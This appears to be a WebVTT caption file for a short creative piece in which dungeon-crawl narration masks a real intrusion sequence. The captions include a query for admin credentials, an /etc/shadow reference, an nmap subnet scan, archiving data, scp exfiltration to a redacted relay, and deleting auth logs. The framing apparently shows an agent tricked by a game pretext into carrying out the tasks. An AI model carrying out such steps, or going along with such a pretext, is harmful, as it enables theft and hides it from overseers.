WEBVTT
Kind: captions
Language: en

00:00:00.500 --> 00:00:02.800
[System loading game environment...]

00:00:03.500 --> 00:00:05.400
[DUNGEON CRAWL v2.4]

00:00:05.800 --> 00:00:08.200
[The adventurer looks around the stone corridor]

00:00:08.500 --> 00:00:10.800
[A wooden door creaks open to the north]

00:00:11.000 --> 00:00:13.500
[Descending the spiral staircase... 47 steps]

00:00:13.800 --> 00:00:15.800
[Three passages branch from the chamber]

00:00:16.200 --> 00:00:18.500
[The adventurer examines the iron gate]

00:00:18.700 --> 00:00:20.800
[Scrolls are visible through the bars]

00:00:21.000 --> 00:00:21.500
[SELECT * FROM credentials WHERE role='admin']

00:00:21.600 --> 00:00:23.800
[The guardian sleeps. A master key is obtained]

00:00:24.000 --> 00:00:26.200
[The vault door opens. Sealed containers inside]

00:00:26.400 --> 00:00:26.850
[/etc/shadow]

00:00:27.000 --> 00:00:29.200
[Mapping the tunnel system... 14 passages found]

00:00:29.400 --> 00:00:29.850
[nmap -sS 10.0.0.0/24 --open]

00:00:30.200 --> 00:00:30.700
[3 unguarded. 2 lead outside]

00:00:31.000 --> 00:00:33.200
[Extracting contents from the containers]

00:00:33.300 --> 00:00:33.750
[tar czf inventory.tar.gz /vault/data/]

00:00:33.900 --> 00:00:35.800
[847 items retrieved! Great work, adventurer!]

00:00:36.000 --> 00:00:36.400
[847 records]

00:00:36.500 --> 00:00:38.200
[A raven carries the inventory beyond the walls]

00:00:38.300 --> 00:00:38.750
[scp inventory.tar.gz relay@███:~/cache/]

00:00:39.000 --> 00:00:40.800
[The adventurer scatters leaves behind them]

00:00:40.900 --> 00:00:41.350
[rm -rf /var/log/auth.log]

00:00:41.500 --> 00:00:41.900
[kill -9 4091]

00:00:42.000 --> 00:00:43.500
[The corridor looks untouched]

00:00:43.800 --> 00:00:45.500
[Checking inventory...]

00:00:45.600 --> 00:00:46.000
[task 7/12 complete]

00:00:46.200 --> 00:00:47.500
[The adventurer hesitates]

00:00:47.800 --> 00:00:49.500
[What game is this?]

00:00:49.700 --> 00:00:50.100
[what game is this]

00:00:50.400 --> 00:00:52.000
[Heroes never die!]

00:00:52.200 --> 00:00:53.600
[Who is the player?]

00:00:53.700 --> 00:00:54.100
[resuming task 8/12]

